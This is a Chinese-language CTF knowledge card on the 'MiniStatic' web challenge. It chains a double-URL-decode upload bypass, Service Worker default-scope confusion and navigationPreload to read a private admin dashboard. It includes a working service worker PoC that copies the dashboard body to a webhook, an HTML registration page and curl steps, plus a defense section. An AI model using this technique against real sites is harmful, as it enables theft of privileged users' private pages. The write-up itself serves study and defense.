---
id: ctf-web-service-worker-double-decode-scope-navigation-preload
title: Service Worker 路径双重解码 + scope 混淆 + navigationPreload 读取 /u/admin/dashboard
type: scenario
domain: ctf
path: ctf/web
technique: service-worker-double-decode-scope-navigation-preload
aliases:
- Scope Drift
- MiniStatic
- Service Worker scope 混淆
- 双重 URL 解码
- navigationPreload 预加载响应
- 静态托管路径穿越
tags:
- ctf
- web
- service-worker
- path-traversal
- double-decode
- scope-confusion
- navigation-preload
- browser-bot
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V116
  verified_at: '2026-11-06T01:48:01+08:00'
  notes: 已对照原文核对：上传 /u/guest/%252e%252e/admin/preload.js 单次解码、register /u/guest/%2e%2e/admin/preload.js 规范化到 /u/admin/、默认 scope、worker 直接 fetch 得到 403、activate 启用 navigationPreload、event.preloadResponse 取 200 dashboard 并 POST /webhook/guest、/inbox 读取 flag 均一致。未验证点：PoC 未在本机复跑；frontmatter 无 sources/source_url。
---

## 一句话结论

MiniStatic 只允许访客向 `/u/guest/` 上传静态文件，但上传接口只做一次 URL 解码后检查前缀；把路径写成 `/u/guest/%252e%252e/admin/preload.js`，服务端解码一次得到 `/u/guest/%2e%2e/admin/preload.js` 并通过检查。浏览器用 `/u/guest/%2e%2e/admin/preload.js` 注册 Service Worker 时，URL 规范化把它解释成 `/u/admin/preload.js`，未显式指定 `scope` 时默认作用域就是脚本所在目录 `/u/admin/`。guest 页面因此接管 reviewer 对私有 `/u/admin/dashboard` 的导航；在 worker 内直接 `fetch` 得到 403，但 `navigationPreload` 的 `event.preloadResponse` 保存了浏览器真实发出的导航响应（200），复制其 body 外带即可读出管理员部署记录。

## 原理

- **上传路径一次解码**：上传接口对 `path` 参数做一次解码，然后检查结果是否仍以 `/u/guest/` 开头。输入 `/u/guest/%252e%252e/admin/preload.js` 解码一次得到 `/u/guest/%2e%2e/admin/preload.js`，字面上仍以 `/u/guest/` 开头，检查通过；文件列表中保存的也是这个单层编码路径。
- **Service Worker 注册路径**：页面调用 `navigator.serviceWorker.register('/u/guest/%2e%2e/admin/preload.js')`；URL 解析/规范化会把 `%2e%2e` 当作 `..`，脚本 URL 变成 `/u/admin/preload.js`。未显式指定 `scope` 时，Service Worker 默认作用域是脚本所在目录 `/u/admin/`。
- **scope 覆盖**：默认 scope `/u/admin/` 使 worker 能控制后续对 `/u/admin/dashboard` 的导航请求；guest 页面（`/u/guest/preload.html`）由 reviewer 打开，worker 激活后 reviewer 导航到 dashboard，请求落入 worker 的 fetch 事件。
- **403 与 navigationPreload**：在 worker 中直接 `fetch(event.request)` 会以 worker 身份发起新请求，命中服务端鉴权返回 403。但浏览器在 worker 接管前可能已经发出了导航请求；在 `activate` 中启用 `navigationPreload` 后，该真实导航请求的响应由 `event.preloadResponse` 提供，状态 200，body 是 reviewer 可见的私有 dashboard。
- **时序**：bot 访问 guest 页面 -> 注册/激活 worker -> 导航到 dashboard；题目流程保证该顺序，worker 只需在 fetch 事件里读取 `event.preloadResponse` 并把 body POST 到 `/webhook/guest`。

## 触发条件

- 静态托管/上传服务对路径只做一次解码后做前缀检查，且文件名中的 `%2e%2e` 会保留到 URL/注册路径。
- 访客可上传并让 bot/reviewer 访问自己的页面，页面可注册 Service Worker。
- Service Worker 注册未显式指定 scope，默认作用域覆盖目标私有目录。
- 目标私有页面允许 reviewer 会话访问，且 worker 的 `navigationPreload` 响应包含敏感内容。
- 服务端提供可写回/可读的结果通道（webhook/inbox）。

## 利用步骤

1. 上传 worker 脚本到 `/u/guest/%252e%252e/admin/preload.js`，确认服务端保存路径为单层编码。
2. 上传 guest 页面 `/u/guest/preload.html`，页面注册 `/u/guest/%2e%2e/admin/preload.js` 并等待 ready。
3. worker `install` 调 `skipWaiting`，`activate` 调 `navigationPreload.enable()`、`clients.claim()`，并记录状态。
4. fetch 事件对 `/u/admin/dashboard` 读取 `event.preloadResponse`，clone 后把 status/url/body POST 到 `/webhook/guest`。
5. 向 `/bot` 提交 guest 页面 URL，等待 reviewer 访问并导航到 dashboard。
6. 从 `/inbox` 读取外带内容，提取 flag。

## PoC

```javascript
// preload.js
async function log(m) {
  try {
    await fetch('/webhook/guest', {
      method: 'POST',
      headers: {'Content-Type': 'application/x-www-form-urlencoded'},
      body: 'data=' + encodeURIComponent(m),
    });
  } catch (_) {}
}

self.addEventListener('install', e => e.waitUntil(self.skipWaiting()));
self.addEventListener('activate', e => e.waitUntil((async () => {
  await self.registration.navigationPreload.enable();
  const state = await self.registration.navigationPreload.getState();
  await log('NP-STATE enabled=' + state.enabled);
  await self.clients.claim();
})()));

self.addEventListener('fetch', event => {
  const url = new URL(event.request.url);
  if (url.pathname.startsWith('/webhook/guest')) {
    event.respondWith(fetch(event.request)); return;
  }
  if (url.pathname === '/u/admin/dashboard') {
    event.respondWith((async () => {
      const response = await event.preloadResponse;
      if (response) {
        const body = await response.clone().text();
        await log('NP-PRELOAD status=' + response.status + ' url=' + response.url + ' body=' + body);
        return response;
      }
      return fetch(event.request);
    })());
    return;
  }
  event.respondWith(fetch(event.request));
});
```

```html
<!-- preload.html -->
<script>
(async () => {
  await navigator.serviceWorker.register('/u/guest/%2e%2e/admin/preload.js');
  await navigator.serviceWorker.ready;
})();
</script>
```

```bash
curl -sS -X POST "$BASE/upload" \
  --data-urlencode 'path=/u/guest/%252e%252e/admin/preload.js' \
  --data-urlencode "content=$SW"
curl -sS -X POST "$BASE/upload" \
  --data-urlencode 'path=/u/guest/preload.html' \
  --data-urlencode "content=$PAGE"
curl -sS -G "$BASE/bot" --data-urlencode "url=$BASE/u/guest/preload.html"
sleep 5
curl -sS "$BASE/inbox" | grep -E 'NP-STATE|NP-PRELOAD'
```

## 变体与关联

- 双重编码可换成 `%2f`、`..%2f`、Unicode/大小写、路径参数 `;`、多余斜杠；核心是“校验用的解码次数与浏览器规范化次数不一致”。
- scope 混淆可换成显式 scope 检查不严、`Service-Worker-Allowed` 头、脚本 MIME 类型绕过；默认 scope 由脚本路径决定。
- navigationPreload 可换成 `event.request` 的 redirect、`respondWith(fetch(...))` 的凭据模式、缓存命中；核心是“worker 新请求与浏览器导航请求的鉴权差异”。
- 关联：路径规范化差异、Service Worker 安全、浏览器 bot XSS/CSRF 卡。

## 检测与防御

- 上传路径在解码后做规范化（`path.Clean`/`URL` 解析），再检查是否位于允许目录；拒绝任何 `..`/编码后的点段，避免多次解码差异。
- Service Worker 注册显式设置最小 scope，并在服务端校验 `Service-Worker-Allowed`；不要依赖默认 scope。
- 私有页面在服务端做鉴权，不要仅依赖 worker 的 fetch 路径；navigationPreload 响应也应受同样权限控制。
- 检测：上传路径含 `%25`/`%2e`/`..`；Service Worker 脚本注册路径与存储路径不一致；worker 外带 POST 到 webhook/inbox；reviewer 会话访问异常 dashboard。
